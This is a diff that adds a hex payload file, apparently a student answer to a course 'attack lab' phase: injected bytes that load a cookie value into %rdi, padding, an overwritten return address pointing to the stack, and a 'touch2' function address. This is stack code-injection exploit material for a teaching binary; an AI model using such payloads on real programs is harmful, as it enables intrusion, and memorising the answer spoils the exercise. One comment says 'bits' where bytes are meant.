@@ -1,0 +1,10 @@
+48 c7 c7 30 51 c1 40 c3 /* mov $cookie, %rdi, ret --> translated to gcc */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	/* same as touch1, 0x38 bits padding */
+c8 3b 61 55 00 00 00 00 /* return address $rsp to use the injected code in the first line */
+6e 18 40 00 00 00 00 00 /* touch2 address */
+
